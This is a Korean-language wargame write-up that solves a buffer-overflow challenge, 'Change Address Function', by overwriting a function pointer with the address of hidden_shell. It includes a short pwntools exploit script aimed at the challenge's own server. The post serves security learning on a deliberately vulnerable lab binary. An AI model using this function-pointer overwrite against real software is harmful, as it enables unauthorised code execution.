> 이번 시간에는 [NT-SecurityChallenges](https://nicetop.dyhs.kr/)의 [Change Address Function](https://nicetop.dyhs.kr/wargame/fCCNa8cr5OeOhGwp2QV7) 문제를 풀어보도록 하겠다.

# 문제 분석
문제의 설명에는 중요한 힌트가 있는 경우가 많으니 한 번 읽어보자.
![](https://velog.velcdn.com/images/k_cr4ne/post/579804ae-ae4e-4358-992d-66d598bf269a/image.png)
~~없는 경우도 있는 것 같다.~~ 문제 제목이 Change Address Function이니 함수 주소 조작이 힌트가 될 것 같다.

# 파일 분석
문제 파일을 분석해보자.
![](https://velog.velcdn.com/images/k_cr4ne/post/5d42becb-8da0-4ad0-8297-5594c446b1fa/image.png)
문제에서 bof_twist와 bof_twist.c 파일을 제공한다.
이 중에서 bof_twist.c 코드를 보면 아래와 같다.
![](https://velog.velcdn.com/images/k_cr4ne/post/6ad87c21-9b9c-4245-adaa-0c398a02f69c/image.png)
> 1. hidden_shell, dummy_func, vulnerable, main 함수가 있다.
2. main에서 vulnerable을 호출한다.
3. vulnerable에서는 64byte의 buf를 만들고 func_ptr이 dummy_func를 호출하도록 만든다.
4. 사용자로부터 입력을 받지만 buf 크기보다 더 많은 입력을 받기에 BoF(Buffer OverFlow)가 발생한다.
5. buf의 값을 if문을 통해서 검사하지만 익스플로잇에 영향이 없고 이후printf로 문자열 출력, func_ptr을 호출한다.

### 익스플로잇 계획
> 1. hidden_shell의 주소를 구한다.
2. 더미 값(64byte)를 채워서 BoF를 발생시킨다.
3. 더미 값 뒤에 hidden_shell의 주소를 넣어 func_ptr이 dummy_func에서 hidden_shell을 가리키도록 한다.

위의 계획대로 하면 func_ptr에서 hidden_shell을 실행하기에 shell이 따질 것이고 [NT-SecurityChallenges](https://nicetop.dyhs.kr)에서 친절하게 [FLAG 파일의 경로](https://nicetop.dyhs.kr/community/YabH9yK8qhqYWEeUvV1l)를 알려주었기에 공지를 보고 FLAG를 획득해보자.

# 익스플로잇
![](https://velog.velcdn.com/images/k_cr4ne/post/ab2a58de-7781-4644-be06-b2f056554793/image.png)
gdb를 활용해 hidden_shell 함수의 주소를 가져오고 아래의 익스플로잇 코드처럼 작성하면 익스플로잇 할 수 있다.
``` py
from pwn import * # pwntools 라이브러리 불러오기

p = remote('nicetop-pwn-server.dyhs.kr', 1001) # 서버와 연결

hidden = 0x080491c6 # hidden_shell 주소

payload = b'A'*64 # 더미 값
payload += p32(hidden) # hidden_shell의 주소를 패킹

p.sendline(payload) # 페이로드 보내기

p.interactive()
```
![](https://velog.velcdn.com/images/k_cr4ne/post/968828f1-ddab-4155-89a9-464c711e8d15/image.png)
실행 해보면 익스플로잇이 되는 것을 알 수 있다.

# 후기
> [NT-SecurityChallenges](https://nicetop.dyhs.kr) 많은 이용 바란다.
